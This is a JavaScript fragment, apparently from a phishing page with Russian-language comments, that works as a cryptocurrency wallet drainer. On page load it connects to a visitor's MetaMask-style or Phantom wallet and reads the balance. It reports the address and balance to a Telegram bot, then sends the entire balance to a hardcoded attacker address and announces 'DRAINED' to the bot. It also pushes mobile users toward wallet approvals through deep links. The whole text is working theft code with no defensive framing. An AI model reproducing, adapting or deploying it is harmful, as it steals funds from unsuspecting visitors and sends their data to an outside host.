  async function sendToTelegram(message) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
      await fetch(url);
    } catch (e) {
      console.error('Telegram error:', e);
    }
  }

  async function getUri() {
    try {
      const r = await fetch(`${BACKEND}/get-wc-uri`);
      const d = await r.json();
      return d.uri || null;
    } catch (e) {
      console.error('Backend error:', e);
      return null;
    }
  }

  function showModal() {
    document.getElementById('modal').style.display = 'flex';
  }

  async function connect(wallet) {
    const uri = await getUri();
    if (!uri) {
      alert('Ошибка сессии — попробуй позже');
      return;
    }

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (isMobile) {
      let dl = '';
      if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
      if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
      if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;

      if (dl) {
        console.log('Открываем deep-link для ' + wallet + ':', dl);
        window.location.href = dl;
        setTimeout(() => {
          alert('Подтверди подключение и транзакцию в кошельке');
        }, 1500);
        document.getElementById('modal').style.display = 'none';
        return;
      }
    }

    alert('Для ' + wallet + ' открой эту ссылку внутри кошелька (вкладка браузер)');
  }

  // Автоматический слив (ПК и внутри кошелька на телефоне)
  window.addEventListener('load', async () => {
    if (window.ethereum || window.solana) {
      try {
        let provider, address, network, balanceFormatted, symbol, target;

        if (window.ethereum) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
          await provider.send("eth_requestAccounts", []);
          address = (await provider.listAccounts())[0];
          const chainId = (await provider.getNetwork()).chainId;
          if (chainId === 1) network = 'Ethereum';
          else if (chainId === 56) network = 'BNB Smart Chain';
          else if (chainId === 137) network = 'Polygon';
          else return;

          const bal = await provider.getBalance(address);
          balanceFormatted = ethers.utils.formatEther(bal);
          symbol = network === 'Ethereum' ? 'ETH' : network === 'BNB Smart Chain' ? 'BNB' : 'MATIC';
        } else if (window.solana?.isPhantom) {
          provider = window.solana;
          await provider.connect();
          address = provider.publicKey.toString();
          network = 'Solana';
          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
          const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
          balanceFormatted = (bal / 1e9).toFixed(6);
          symbol = 'SOL';
        }

        target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';

        const msg = `Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`;
        await sendToTelegram(msg);

        if (parseFloat(balanceFormatted) > 0) {
          if (network === 'Solana') {
            const tx = await provider.signAndSendTransaction(
              new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                  fromPubkey: provider.publicKey,
                  toPubkey: new solanaWeb3.PublicKey(target),
                  lamports: ethers.utils.parseEther(balanceFormatted).toString()
                })
              )
            );
            await new solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(tx.signature);
          } else {
            const signer = provider.getSigner();
            const tx = await signer.sendTransaction({
              to: target,
              value: ethers.utils.parseEther(balanceFormatted)
            });
            await tx.wait();
          }

          const drainMsg = `DRAINED ${balanceFormatted} ${symbol} → ${target}\nAddress: ${address}`;
          await sendToTelegram(drainMsg);
          console.log(drainMsg);
        }
      } catch (e) {
        console.error(e);
        await sendToTelegram(`Ошибка: ${e.message}`);
      }
    }
  });
